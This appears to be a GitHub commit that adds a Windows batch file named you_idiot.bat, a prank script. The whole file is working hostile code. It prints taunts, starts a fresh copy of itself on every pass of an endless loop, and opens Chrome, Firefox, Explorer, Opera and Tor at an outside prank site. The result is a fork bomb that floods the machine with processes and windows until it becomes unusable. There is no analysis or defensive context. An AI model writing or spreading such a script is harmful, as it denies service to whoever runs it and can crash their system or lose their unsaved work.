67e224aa0c6e922533c963521e2b5efe51ca4a7e
DeterminedAkA <66995488+DeterminedAkA@users.noreply.github.com>
2020-07-24 16:10:12 +0200

    Add files via upload

---
+++ you_idiot.bat
@@ -0,0 +1,15 @@
+:go
+@echo off
+cls
+echo you are an idiot!
+echo hahahahah
+echo =)
+start you_idiot.bat
+timeout 1
+start chrome piv.pivpiv.dk
+start firefox piv.pivpiv.dk
+start explorer piv.pivpiv.dk
+start opera piv.pivpiv.dk
+start tor piv.pivpiv.dk
+start tor broswer piv.pivpiv.dk
+goto go
